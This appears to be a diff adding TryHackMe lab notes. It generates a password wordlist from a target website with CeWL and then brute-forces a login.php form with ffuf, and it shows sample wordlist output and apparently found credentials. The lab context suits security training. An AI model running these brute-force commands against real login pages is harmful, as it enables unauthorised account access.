@@ -1,0 +1,20 @@
+##Create a password list using CeWL: Use the AntarctiCrafts homepage to generate a wordlist that could potentially hold the key to the portal.
+
+user@tryhackme$ cewl -d 2 -m 5 -w passwords.txt http://10.10.187.114 --with-numbers
+user@tryhackme$ cat passwords.txt
+telephone
+support
+Image
+Professional
+Stuffs
+Ready
+Business
+Isaias
+Security
+Daniel
+[--snip--]
+
+Isaias
+Happiness
+
+ ffuf -s -w usernames.txt:USER -w passwords.txt:PASS -u http://10.10.106.165/login.php -d "username=USER&password=PASS" -H "Content-Type: application/x-www-form-urlencoded" -fr "Please enter the correct credentials"
